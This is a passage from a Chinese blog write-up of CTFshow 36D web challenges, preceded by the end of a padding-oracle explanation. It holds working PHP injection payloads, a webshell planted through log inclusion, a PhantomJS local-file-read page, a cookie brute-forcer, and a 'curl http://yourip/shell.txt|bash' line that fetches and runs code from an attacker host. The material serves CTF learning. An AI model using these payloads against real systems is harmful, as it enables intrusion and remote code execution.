src=\"https://image.3001.net/images/20171019/15083453084853.png!small\" alt=\"Padding oracle attack详细解析\"></p>\n<p>（4）再假定明文填充了两字节也就是明文最后两字节是0x02，接着构造倒数第二组密文，我们把M1与0x02异或可以得到填充两字节时密文的最后一位应该是什么，这时候我们只需要对倒数第二位进行不断地赋值尝试（也是从0x00到0xff），当服务器返回值表示可以正常解密时，我们把此时的倒数第二位密文的取值与0x02异或便可得到最后一组密文倒数第二字节对应的中间值；</p>\n<p>（5）后再构造出倒数第三倒数第四直到得到最后一组密文的中间值，把这个中间值与截获的密文的倒数第二位异或便可得到最后一组分组的明文；</p>\n<p>（6）舍弃掉最后一组密文，只提交第一组到倒数第二组密文，通过构造倒数第三组密文得到倒数第二组密文的铭文，最后我们便可以得到全部的明文</p>\n</blockquote>\n","categories":["密码学"],"tags":["CBC"]},{"title":"CTFshow36D杯web复现","url":"/2020/07/08/CTFshow_36D_wp/","content":"<p>好早的比赛了。</p>\n<a id=\"more\"></a>\n\n<h3 id=\"你取吧\"><a href=\"#你取吧\" class=\"headerlink\" title=\"你取吧\"></a>你取吧</h3><p>打开靶机直接给出源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\">show_source(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">$hint=file_get_contents(<span class=\"string\">'php://filter/read=convert.base64-encode/resource=hhh.php'</span>);</span><br><span class=\"line\">$code=$_REQUEST[<span class=\"string\">'code'</span>];</span><br><span class=\"line\">$_=<span class=\"keyword\">array</span>(<span class=\"string\">'a'</span>,<span class=\"string\">'b'</span>,<span class=\"string\">'c'</span>,<span class=\"string\">'d'</span>,<span class=\"string\">'e'</span>,<span class=\"string\">'f'</span>,<span class=\"string\">'g'</span>,<span class=\"string\">'h'</span>,<span class=\"string\">'i'</span>,<span class=\"string\">'j'</span>,<span class=\"string\">'k'</span>,<span class=\"string\">'m'</span>,<span class=\"string\">'n'</span>,<span class=\"string\">'l'</span>,<span class=\"string\">'o'</span>,<span class=\"string\">'p'</span>,<span class=\"string\">'q'</span>,<span class=\"string\">'r'</span>,<span class=\"string\">'s'</span>,<span class=\"string\">'t'</span>,<span class=\"string\">'u'</span>,<span class=\"string\">'v'</span>,<span class=\"string\">'w'</span>,<span class=\"string\">'x'</span>,<span class=\"string\">'y'</span>,<span class=\"string\">'z'</span>,<span class=\"string\">'\\~'</span>,<span class=\"string\">'\\^'</span>);</span><br><span class=\"line\">$blacklist = array_merge($_);</span><br><span class=\"line\"><span class=\"keyword\">foreach</span> ($blacklist <span class=\"keyword\">as</span> $blacklisted) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (preg_match (<span class=\"string\">'/'</span> . $blacklisted . <span class=\"string\">'/im'</span>, $code)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">'nonono'</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"keyword\">eval</span>(<span class=\"string\">\"echo($code);\"</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span>wu</span><br></pre></td></tr></table></figure>\n\n<p><code>$hint</code>是hhh.php内容的base形式，可通过post或get方法传入code，<code>$_</code>是一个包含了所有小写字母和<code>~,^</code>的 数组并传递给了<code>$blacklist</code>，遍历<code>$blacklist</code>，如果匹配到了数组内的元素，输出nonono，执行传入的<code>$code</code>但有个echo挡了一下。</p>\n<h4 id=\"解1：数组下标取值\"><a href=\"#解1：数组下标取值\" class=\"headerlink\" title=\"解1：数组下标取值\"></a>解1：数组下标取值</h4><p>由于并未过滤<code>$</code>和<code>[]</code>，可以用数组的下标数字把数组内的值取出来组合，比如<code>ls /</code>就变成了<code>$_[13]$_[18] /</code>，那么<br><code>$__：$_[18].$_[24].$_[18].$_[19].$_[4].$_[11] =&gt; system</code><br><code>$___：$_[13].$_[18].&#39; &#39;.&#39;/&#39; =&gt; ls /</code><br>拼接一下即可</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200707213715.png\" alt=\"\"></p>\n<p><code>12)</code>闭合前面<code>echo(</code>，<code>(12</code>闭合后面的<code>)</code><br>不闭合也行，php中，反引号可以用来执行命令，比如echo</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200707214159.png\" alt=\"\"></p>\n<p>那么也不需要点号拼接值了，直接执行</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200707214350.png\" alt=\"\"></p>\n<p>构造相应的<code>cat /flag</code>即可</p>\n<h4 id=\"解2：位移运算符\"><a href=\"#解2：位移运算符\" class=\"headerlink\" title=\"解2：位移运算符\"></a>解2：位移运算符</h4><p>Ascii表中，<code>&#39;@&#39;|&#39;(任何左侧符号)&#39;==&#39;(右侧小写字母)&#39;</code>，比如<code>&#39;@&#39;|&#39;!&#39;==&#39;a&#39;</code>,<code>&#39;@&#39;|&#39;(&#39;==&#39;h&#39;</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200707220249.png\" alt=\"\"></p>\n<p>那么我们构造<code>&#39;@@@@&#39;|&#39;().4&#39;</code>就是hint，传入<code>($_ = &#39;@@@@&#39;|&#39;().4&#39;) == 1?1:$$_</code>，如果<code>&#39;@@@@&#39;|&#39;().4&#39;!=1</code>，就会执行<code>$$_</code>，也就是echo出<code>$hint</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200707220607.png\" alt=\"\"></p>\n<p>解码得<code>&lt;?php $a=&quot;/phpjiami.zip\\n/hint.php&quot;; ?&gt;</code>，phpjiami.zip下载下来是一个混淆的php源码</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200707220943.png\" alt=\"\"></p>\n<p>解码脚本：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\"></span><br><span class=\"line\">function decrypt($data, $key)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    $data_1 &#x3D; &#39;&#39;;</span><br><span class=\"line\">    for ($i &#x3D; 0; $i &lt; strlen($data); $i++) &#123;</span><br><span class=\"line\">        $ch &#x3D; ord($data[$i]);</span><br><span class=\"line\">        if ($ch &lt; 245) &#123;</span><br><span class=\"line\">            if ($ch &gt; 136) &#123;</span><br><span class=\"line\">                $data_1 .&#x3D; chr($ch &#x2F; 2);</span><br><span class=\"line\">            &#125; else &#123;</span><br><span class=\"line\">                $data_1 .&#x3D; $data[$i];</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $data_1 &#x3D; base64_decode($data_1);</span><br><span class=\"line\">    $key &#x3D; md5($key);</span><br><span class=\"line\">    $j &#x3D; $ctrmax &#x3D; 32;</span><br><span class=\"line\">    $data_2 &#x3D; &#39;&#39;;</span><br><span class=\"line\">    for ($i &#x3D; 0; $i &lt; strlen($data_1); $i++) &#123;</span><br><span class=\"line\">        if ($j &lt;&#x3D; 0) &#123;</span><br><span class=\"line\">            $j &#x3D; $ctrmax;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        $j--;</span><br><span class=\"line\">        $data_2 .&#x3D;  $data_1[$i] ^ $key[$j];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return $data_2;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function find_data($code)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    $code_end &#x3D; strrpos($code, &#39;?&gt;&#39;);</span><br><span class=\"line\">    if (!$code_end) &#123;</span><br><span class=\"line\">        return &quot;&quot;;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    $data_start &#x3D; $code_end + 2;</span><br><span class=\"line\">    $data &#x3D; substr($code, $data_start, -46);</span><br><span class=\"line\">    return $data;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function find_key($code)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    &#x2F;&#x2F; $v1 &#x3D; $v2(&#39;bWQ1&#39;);</span><br><span class=\"line\">    &#x2F;&#x2F; $key1 &#x3D; $v1(&#39;??????&#39;);</span><br><span class=\"line\">    $pos1 &#x3D; strpos($code, &quot;(&#39;&quot; . preg_quote(base64_encode(&#39;md5&#39;)) . &quot;&#39;);&quot;);</span><br><span class=\"line\">    $pos2 &#x3D; strrpos(substr($code, 0, $pos1), &#39;$&#39;);</span><br><span class=\"line\">    $pos3 &#x3D; strrpos(substr($code, 0, $pos2), &#39;$&#39;);</span><br><span class=\"line\">    $var_name &#x3D; substr($code, $pos3, $pos2 - $pos3 - 1);</span><br><span class=\"line\">    $pos4 &#x3D; strpos($code, $var_name, $pos1);</span><br><span class=\"line\">    $pos5 &#x3D; strpos($code, &quot;(&#39;&quot;, $pos4);</span><br><span class=\"line\">    $pos6 &#x3D; strpos($code, &quot;&#39;)&quot;, $pos4);</span><br><span class=\"line\">    $key &#x3D; substr($code, $pos5 + 2, $pos6 - $pos5 - 2);</span><br><span class=\"line\">    return $key;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$input_file &#x3D; $argv[1];</span><br><span class=\"line\">$output_file &#x3D; $argv[1] . &#39;.decrypted.php&#39;;</span><br><span class=\"line\"></span><br><span class=\"line\">$code &#x3D; file_get_contents($input_file);</span><br><span class=\"line\"></span><br><span class=\"line\">$data &#x3D; find_data($code);</span><br><span class=\"line\">if (!$code) &#123;</span><br><span class=\"line\">    echo &#39;未找到加密数据&#39;, PHP_EOL;</span><br><span class=\"line\">    exit;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$key &#x3D; find_key($code);</span><br><span class=\"line\">if (!$key) &#123;</span><br><span class=\"line\">    echo &#39;未找到秘钥&#39;, PHP_EOL;</span><br><span class=\"line\">    exit;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">$decrypted &#x3D; decrypt($data, $key);</span><br><span class=\"line\">$uncompressed &#x3D; gzuncompress($decrypted);</span><br><span class=\"line\">&#x2F;&#x2F; 由于可以不勾选代码压缩的选项，所以这里判断一下是否解压成功，解压失败就是没压缩</span><br><span class=\"line\">if ($uncompressed) &#123;</span><br><span class=\"line\">    $decrypted &#x3D; str_rot13($uncompressed);</span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">    $decrypted &#x3D; str_rot13($decrypted);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">file_put_contents($output_file, $decrypted);</span><br><span class=\"line\">echo &#39;解密后文件已写入到 &#39;, $output_file, PHP_EOL;</span><br></pre></td></tr></table></figure>\n\n<p><code>php 脚本.php 目标.php</code>即可解码</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200707221641.png\" alt=\"\"></p>\n<p>解码有个一句话</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">?&gt;&lt;?php @eval(&quot;&#x2F;&#x2F;Encode by  phpjiami.com,Free user.&quot;); ?&gt;&lt;?php</span><br><span class=\"line\">$ch &#x3D; explode(&quot;.&quot;,&quot;hello.ass.world.er.rt.e.saucerman&quot;);</span><br><span class=\"line\">$c &#x3D; $ch[1].$ch[5].$ch[4]; </span><br><span class=\"line\">@$c($_POST[7-1]);</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">&lt;?php</span><br></pre></td></tr></table></figure>\n\n<p>访问hint.php，6=system(‘cat /flag’)即可</p>\n<h4 id=\"解3：无字母数字rce\"><a href=\"#解3：无字母数字rce\" class=\"headerlink\" title=\"解3：无字母数字rce\"></a>解3：无字母数字rce</h4><p>p神文章：<a href=\"https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html\" target=\"_blank\" rel=\"noopener\">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p>\n<p>POST传入：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$_&#x3D;[];$_&#x3D;@&quot;$_&quot;;$_&#x3D;$_[&#39;!&#39;&#x3D;&#x3D;&#39;@&#39;];$___&#x3D;$_;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.&#x3D;$__;$___.&#x3D;$__;$__&#x3D;$_;$__++;$__++;$__++;$__++;$___.&#x3D;$__;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.&#x3D;$__;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.&#x3D;$__;$____&#x3D;&#39;_&#39;;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.&#x3D;$__;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.&#x3D;$__;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.&#x3D;$__;$__&#x3D;$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.&#x3D;$__;$_&#x3D;$$____;$___($_[_]);</span><br><span class=\"line\"></span><br><span class=\"line\">_&#x3D;system(&#39;cat &#x2F;flag&#39;);</span><br></pre></td></tr></table></figure>\n\n<p>同样用<code>12)</code>，<code>(12</code>闭合echo，另外最好整个url编码一下，类型x-www-form-urlencoded</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200707223453.png\" alt=\"\"></p>\n<h3 id=\"给你shell\"><a href=\"#给你shell\" class=\"headerlink\" title=\"给你shell\"></a>给你shell</h3><p>打开靶机只有一句<code>I prepared a webshell for you</code>，源码处有隐藏跳转</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708081717.png\" alt=\"\"></p>\n<p>访问得源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">//It's no need to use scanner. Of course if you want, but u will find nothing.</span></span><br><span class=\"line\">error_reporting(<span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">include</span> <span class=\"string\">\"config.php\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'view_source'</span>])) &#123;</span><br><span class=\"line\">    show_source(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">    <span class=\"keyword\">die</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">checkCookie</span><span class=\"params\">($s)</span> </span>&#123;</span><br><span class=\"line\">    $arr = explode(<span class=\"string\">':'</span>, $s);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($arr[<span class=\"number\">0</span>] === <span class=\"string\">'&#123;\"secret\"'</span> &amp;&amp; preg_match(<span class=\"string\">'/^[\\\"0-9A-Z]*&#125;$/'</span>, $arr[<span class=\"number\">1</span>]) &amp;&amp; count($arr) === <span class=\"number\">2</span> ) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">true</span>;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( !theFirstTimeSetCookie() ) setcookie(<span class=\"string\">'secret'</span>, <span class=\"string\">''</span>, time()<span class=\"number\">-1</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">haveFun</span><span class=\"params\">($_f_g)</span> </span>&#123;</span><br><span class=\"line\">    $_g_r = <span class=\"number\">32</span>;</span><br><span class=\"line\">    $_m_u = md5($_f_g);</span><br><span class=\"line\">    $_h_p = strtoupper($_m_u);</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ($i = <span class=\"number\">0</span>; $i &lt; $_g_r; $i++) &#123;</span><br><span class=\"line\">        $_i = substr($_h_p, $i, <span class=\"number\">1</span>);</span><br><span class=\"line\">        $_i = ord($_i);</span><br><span class=\"line\">        print_r($_i &amp; <span class=\"number\">0xC0</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">die</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">isset</span>($_COOKIE[<span class=\"string\">'secret'</span>]) ? $json = $_COOKIE[<span class=\"string\">'secret'</span>] : setcookie(<span class=\"string\">'secret'</span>, <span class=\"string\">'&#123;\"secret\":\"'</span> . strtoupper(md5(<span class=\"string\">'y1ng'</span>)) . <span class=\"string\">'\"&#125;'</span>, time()+<span class=\"number\">7200</span> );</span><br><span class=\"line\">checkCookie($json) ? $obj = @json_decode($json, <span class=\"keyword\">true</span>) : <span class=\"keyword\">die</span>(<span class=\"string\">'no'</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> ($obj &amp;&amp; <span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'give_me_shell'</span>])) &#123;</span><br><span class=\"line\">    ($obj[<span class=\"string\">'secret'</span>] != $flag_md5 ) ? haveFun($flag) : <span class=\"keyword\">echo</span> <span class=\"string\">\"here is your webshell: $shell_path\"</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">die</span>;</span><br></pre></td></tr></table></figure>\n\n<p><code>checkcookie</code>要求传入的cookie只能包含一对键值并且值只能是这个正则允许的字符<br><code>havefun</code>把传入的值md5处理，字母转换为大写并按位<code>&amp;</code>运算，如果是数字和<code>0xC0</code>来<code>&amp;</code>结果就是0，如果是字母则结果是64<br>通过checkCookie则把cookie保存在<code>$obj</code><br>如果cookie中secret的值和<code>$flag_md5</code>相等，则给出<code>shell_path</code>，不等则调用havefun</p>\n<h4 id=\"解题\"><a href=\"#解题\" class=\"headerlink\" title=\"解题\"></a>解题</h4><p>get传入<code>give_me_shhell</code>，给出了havafun处理后的结果</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708105953.png\" alt=\"\"></p>\n<p>可以看到前三位都是0，那么前三位都是数字，从第四位开始有字母，由于<code>!=</code>是弱比较，因此只要数值和字符串的前三位相等，php就会返回true，那么爆破一下即可。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">import requests</span><br><span class=\"line\">url &#x3D; &quot;http:&#x2F;&#x2F;9a0e6a1b-5544-4e24-bcc8-3e31e1701c52.chall.ctf.show&#x2F;?give_me_shell&quot;</span><br><span class=\"line\">s &#x3D; requests.session()</span><br><span class=\"line\">for i in range(10):</span><br><span class=\"line\">        for j in range(10):</span><br><span class=\"line\">                for k in range(10):</span><br><span class=\"line\">                        headers &#x3D; &#123;</span><br><span class=\"line\">                                &#39;cookie&#39;:&#39;secret&#x3D;&#123;&quot;secret&quot;: &#39;+str(i)+str(j)+str(k)+&#39;&#125;&#39;\t\t</span><br><span class=\"line\">\t\t\t                      &#125;</span><br><span class=\"line\">                        res &#x3D; s.get(url,headers &#x3D; headers)</span><br><span class=\"line\">                        if &quot;here is your&quot; in res.text:</span><br><span class=\"line\">                                print(headers)</span><br><span class=\"line\">                                break</span><br></pre></td></tr></table></figure>\n\n<p>得到115，构造<code>{&quot;secret&quot;: 115}</code>替换原来的cookie即可，刷新得到<code>$shell_path</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708111256.png\" alt=\"\"></p>\n<p>访问又得源码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\">session_start();</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;there are some secret waf that you will never know, fuzz me if you can</span><br><span class=\"line\">require &quot;hidden_filter.php&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">if (!$_SESSION[&#39;login&#39;])</span><br><span class=\"line\">    die(&#39;&lt;script&gt;location.href&#x3D;\\&#39;.&#x2F;index.php\\&#39;&lt;&#x2F;script&gt;&#39;);</span><br><span class=\"line\"></span><br><span class=\"line\">if (!isset($_GET[&#39;code&#39;])) &#123;</span><br><span class=\"line\">    show_source(__FILE__);</span><br><span class=\"line\">    exit();</span><br><span class=\"line\">&#125; else &#123;</span><br><span class=\"line\">    $code &#x3D; $_GET[&#39;code&#39;];</span><br><span class=\"line\">    if (!preg_match($secret_waf, $code)) &#123;</span><br><span class=\"line\">        &#x2F;&#x2F;清空session 从头再来</span><br><span class=\"line\">        eval(&quot;\\$_SESSION[&quot; . $code . &quot;]&#x3D;false;&quot;); &#x2F;&#x2F;you know, here is your webshell, an eval() without any disabled_function. However, eval() for $_SESSION only XDDD you noob hacker</span><br><span class=\"line\">    &#125; else die(&#39;hacker&#39;);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;*</span><br><span class=\"line\"> * When you feel that you are lost, do not give up, fight and move on.</span><br><span class=\"line\"> * Being a hacker is not easy, it requires effort and sacrifice.</span><br><span class=\"line\"> * But remember … we are legion!</span><br><span class=\"line\"> *  ————Deep CTF 2020</span><br><span class=\"line\">*&#x2F;</span><br></pre></td></tr></table></figure>\n\n<p>黑名单不可见需要自己测试，如果没有session会跳转，eval只能执行session</p>\n<p>fuzz后过滤内容:</p>\n<blockquote>\n<p>f、sys、include<br>括号、引号、分号<br>^ &amp;等运算符<br>空格 / \\ $ ` * #等符号</p>\n</blockquote>\n<p>payload：<code>]=1?&gt;&lt;?=require~%d0%99%93%9e%98%d1%8b%87%8b?&gt;</code></p>\n<p><code>]=1</code>把<code>$_SESSION</code>闭合，由于分号被过滤使用<code>?&gt;&lt;?</code>来bypass，取反<code>~%d0%99%93%9e%98%d1%8b%87%8b =&gt; /flag.txt</code>，require函数可以不需要括号并且由于PHP黑魔法 <code>require</code>和取反运算符之间也不需要空格就能执行，最后<code>?&gt;</code>闭合</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708114503.png\" alt=\"\"></p>\n<p>同样方法构造即可，payload：<code>]=1?&gt;&lt;?=require~%d0%99%93%9e%98?&gt;</code></p>\n<h3 id=\"RemoteImageDownloader\"><a href=\"#RemoteImageDownloader\" class=\"headerlink\" title=\"RemoteImageDownloader\"></a>RemoteImageDownloader</h3><p>打开靶机一个提交框可以访问外网文件，考点是PhantomJS任意文件读取</p>\n<p>在<a href=\"https://www.gem-love.com/ctf/2127.html#Screenshoter(469)\" target=\"_blank\" rel=\"noopener\">y1ng师傅</a>文章里找到<a href=\"https://web.archive.org/web/20191220171022/https://www.darkmatter.ae/blogs/breaching-the-perimeter-phantomjs-arbitrary-file-read/\" target=\"_blank\" rel=\"noopener\">参考文章</a></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708133153.png\" alt=\"\"></p>\n<h4 id=\"解题-1\"><a href=\"#解题-1\" class=\"headerlink\" title=\"解题\"></a>解题</h4><p>在自己的服务器上创建个文件读本地flag，内容如下：</p>\n<figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"actionscript\">\tx=<span class=\"keyword\">new</span> XMLHttpRequest;</span></span><br><span class=\"line\"><span class=\"actionscript\">\tx.onload=<span class=\"function\"><span class=\"keyword\">function</span><span class=\"params\">()</span></span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">\t<span class=\"built_in\">document</span>.write(<span class=\"keyword\">this</span>.responseText)</span></span><br><span class=\"line\">\t&#125;;</span><br><span class=\"line\"><span class=\"actionscript\">\tx.open(<span class=\"string\">\"GET\"</span>,<span class=\"string\">\"file:///flag\"</span>);</span></span><br><span class=\"line\">\tx.send();</span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>访问该文件地址，得到图片flag</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708134540.png\" alt=\"\"></p>\n<h3 id=\"WEB-ALL-INFO-U-WANT\"><a href=\"#WEB-ALL-INFO-U-WANT\" class=\"headerlink\" title=\"WEB_ALL_INFO_U_WANT\"></a>WEB_ALL_INFO_U_WANT</h3><p>打开靶机可以玩魔方，源码处发现注释</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708135153.png\" alt=\"\"></p>\n<p>扫描之后发现备份文件</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708135349.png\" alt=\"\"></p>\n<p>下载后源码如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">visit all_info_u_want.php and you will get all information you want</span><br><span class=\"line\"></span><br><span class=\"line\">&#x3D; &#x3D;Thinking that it may be difficult, i decided to show you the source code:</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">error_reporting(0);</span><br><span class=\"line\"></span><br><span class=\"line\">&#x2F;&#x2F;give you all information you want</span><br><span class=\"line\">if (isset($_GET[&#39;all_info_i_want&#39;])) &#123;</span><br><span class=\"line\">    phpinfo();</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">if (isset($_GET[&#39;file&#39;])) &#123;</span><br><span class=\"line\">    $file &#x3D; &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;&quot; . $_GET[&#39;file&#39;];</span><br><span class=\"line\">    &#x2F;&#x2F;really baby include</span><br><span class=\"line\">    include($file);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>传入<code>all_info_i_want</code>显示phpinfo，包含传入的file。</p>\n<h4 id=\"解1：日志文件包含\"><a href=\"#解1：日志文件包含\" class=\"headerlink\" title=\"解1：日志文件包含\"></a>解1：日志文件包含</h4><p>nginx日志默认路径是<code>/var/log/nginx/access.log</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708140634.png\" alt=\"\"></p>\n<p>往User-Agent写入一句话</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708142533.png\" alt=\"\"></p>\n<p>再用蚁剑连接即可，但这里文件不容易找，所以反弹shell到自己服务器<br><code>a=system(&#39;curl http://yourip/shell.txt|bash&#39;);</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708143045.png\" alt=\"\"></p>\n<p>直接搜flag文件名找不到，学到了新的flag搜索方式，即搜索文件内容<br><code>find /etc -name &quot;*&quot; | xargs grep &quot;flag{&quot;</code></p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200708143153.png\" alt=\"\"></p>\n<h4 id=\"解2：临时文件包含\"><a href=\"#解2：临时文件包含\" class=\"headerlink\" title=\"解2：临时文件包含\"></a>解2：临时文件包含</h4><p>php会在脚本执行结束后删掉临时文件，通过自身包含自身使之进入死循环，打断死循环让php执行不结束，临时文件就保存下来了<br>构造上传表单</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;96013011-1e57-4c9c-b295-bba1c7e3c44d.chall.ctf.show&#x2F;all_info_u_want.php?file&#x3D;all_info_u_want.php&amp;all_info_i_want&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;</span><br><span class=\"line\">    &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;filename&quot;&gt;</span><br><span class=\"line\">    &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;提交&quot;&gt;</span><br><span class=\"line\">&lt;&#x2F;form&gt;</span><br><span class=\"line\">&lt;&#x2F;body&gt;</span><br><span class=\"line\">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>\n\n<p>上传一句话文件</p>\n<p><img 